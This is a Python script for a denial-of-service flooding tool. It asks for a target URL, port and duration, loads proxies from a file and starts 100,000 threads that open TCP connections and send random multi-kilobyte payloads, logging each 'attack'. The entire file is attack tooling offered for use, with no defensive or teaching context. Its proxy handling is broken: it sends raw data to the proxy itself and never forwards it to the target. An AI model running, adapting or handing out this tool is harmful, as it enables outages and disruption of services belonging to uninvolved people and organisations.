import os
import socket
import threading
import random
import logging
from queue import Queue
from time import sleep, time
from urllib.parse import urlparse


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_payload():
    payload_size = random.randint(4096, 16384)  
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(payload_size)).encode()

def attack_target(target_ip, target_port, user_agent, proxy=None):
    try:
        payload = generate_payload()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if proxy:
            s.settimeout(10)
            s.connect(proxy)
        else:
            s.connect((target_ip, target_port))
        s.send(payload)
        logging.info("Attack sent")
        s.close()
    except Exception as e:
        logging.error(f"Attack failed: {e}")

def read_proxies(filename):
    proxies = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                parts = line.strip().split(':')
                if len(parts) == 2:
                    proxy = (parts[0], int(parts[1]))
                    proxies.append(proxy)
    except FileNotFoundError:
        logging.error(f"File '{filename}' not found.")
    return proxies

def worker(queue, end_time):
    while time() < end_time:
        if queue.empty():
            break
        target_ip, target_port, user_agent, proxy = queue.get()
        attack_target(target_ip, target_port, user_agent, proxy)
        queue.task_done()

def launch_attack(target_ip, target_port, duration):
    logging.info("Launching attack...")

    proxies = read_proxies('proxy.txt')
    user_agent = random.choice(user_agents)
    thread_count = 100000
    
    queue = Queue()
    end_time = time() + duration

    for _ in range(thread_count):
        queue.put((target_ip, target_port, user_agent, random.choice(proxies)))

    for _ in range(thread_count):
        thread = threading.Thread(target=worker, args=(queue, end_time))
        thread.start()

    queue.join()

if __name__ == "__main__":
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"

    ]

    
    os.system('cls' if os.name == 'nt' else 'clear')

    
    target_url = input("Enter target URL: ")
    target_port = int(input("Enter target port: "))
    duration = int(input("Enter attack duration in seconds: "))

    
    parsed_url = urlparse(target_url)
    hostname = parsed_url.hostname

    
    try:
        target_ip = socket.gethostbyname(hostname)
    except socket.gaierror as e:
        logging.error(f"Error resolving URL {target_url}: {e}")
        exit(1)


    launch_attack(target_ip, target_port, duration)
